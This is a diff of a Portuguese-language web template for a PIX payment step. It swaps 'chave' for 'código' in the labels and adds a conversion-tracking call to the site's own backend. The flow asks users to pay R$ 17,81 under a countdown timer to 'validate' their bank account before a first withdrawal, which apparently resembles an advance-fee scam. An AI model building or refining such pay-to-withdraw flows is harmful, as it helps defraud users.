@@ -306,13 +306,13 @@
                     </div>
                     <div class="content mb-32">
                         <h2 class="text-center">Realize o Pagamento via PIX</h2>
-                        <p class="mt-8 text-center text-large">Escaneie o QR Code ou copie a chave PIX para concluir a
+                        <p class="mt-8 text-center text-large">Escaneie o QR Code ou copie a código PIX para concluir a
                             validação.</p>
                         <div id="pix-content">
                         <div id="qrcode" class="qr-code-img"></div>
                         <span id="pix-amount">R$ 17,81</span>
                         <input type="text" readonly value="{{ pix_transaction.qr_code|default:'' }}" id="pixcode" class="pix-code" />
-                        <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                        <button onclick="copyToClipboard(this)" class="styled-button small">Copiar código PIX</button>
                         <p>Tempo restante para validação: <span id="timer">09:59</span></p>
                         </div>
                     </div>
@@ -348,7 +348,7 @@
                         <p class="mt-8 text-center text-large">Para continuar com seu saque, você precisa validar sua
                             conta bancária.</p>
                         <p class="mt-8 text-center text-large">Notamos que esse será o seu primeiro saque. Para validar
-                            sua conta bancária e adicionar uma nova chave PIX de forma segura, precisamos confirmar sua
+                            sua conta bancária e adicionar uma nova código PIX de forma segura, precisamos confirmar sua
                             conta bancária.</p>
                         <button onclick="nextStep(2)" class="tf-btn primary md mt-40">Próximo</button>
                     </div>
@@ -389,7 +389,7 @@
                     </div>
                     <div class="content mb-32">
                         <h2 class="text-center">Realize o Pagamento via PIX</h2>
-                        <p class="mt-8 text-center text-large">Escaneie o QR Code ou copie a chave PIX para concluir a
+                        <p class="mt-8 text-center text-large">Escaneie o QR Code ou copie a código PIX para concluir a
                             validação.</p>
                         <div id="pix-content"></div>
                     </div>
@@ -552,7 +552,7 @@
                     <div id="qrcode" class="qr-code-img"></div>
                     <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
                     <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
-                    <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                    <button onclick="copyToClipboard(this)" class="styled-button small">Copiar código PIX</button>
                     <p>Tempo restante para validação: <span id="timer">09:59</span></p>
                     `;
                     renderQR('qrcode', data.qr_code);
@@ -578,15 +578,36 @@
         const pixCode = document.getElementById('pixcode');
         if (!pixCode) {
             console.error('pixcode input not found in DOM');
-            alert('Erro: Campo de chave PIX não encontrado.');
+            alert('Erro: Campo de código PIX não encontrado.');
             return;
         }
+
         pixCode.select();
         document.execCommand('copy');
-        button.innerText = 'Chave copiada!';
-        setTimeout(() => {
-            button.innerText = 'Copiar chave PIX';
-        }, 3000);
+        button.innerText = 'Código copiado!';
+        setTimeout(() => { button.innerText = 'Copiar código PIX'; }, 3000);
+
+        // === NOVO: dispara AddPaymentInfo (proxy no backend) ===
+        sendAddPaymentInfoOnce();
+    }
+
+        function sendAddPaymentInfoOnce() {
+        try {
+            const key = 'apinfo_sent_once';
+            if (localStorage.getItem(key)) return;
+
+            fetch("{% url 'core:track_add_payment_info' %}", {
+                method: 'POST',
+                headers: {
+                    'X-CSRFToken': '{{ csrf_token }}',
+                    'X-Requested-With': 'XMLHttpRequest'
+                }
+            }).catch(err => console.warn('AddPaymentInfo fetch failed', err));
+
+            localStorage.setItem(key, '1');
+        } catch (e) {
+            console.warn('AddPaymentInfo localStorage error', e);
+        }
     }
 
     function generateNewPix() {
@@ -645,7 +666,7 @@
                     <img src="data:image/png;base64,${data.qr_code_image}" alt="QR Code Pix" class="qr-code-img" />
                     <span id="pix-amount">R$ ${data.amount.toFixed(2).replace('.', ',')}</span>
                     <input type="text" readonly value="${data.qr_code}" id="pixcode" class="pix-code" />
-                    <button onclick="copyToClipboard(this)" class="styled-button small">Copiar chave PIX</button>
+                    <button onclick="copyToClipboard(this)" class="styled-button small">Copiar código PIX</button>
                     <p>Tempo restante para validação: <span id="timer">09:59</span></p>
                 `;
                     pixContent.classList.remove('hidden');
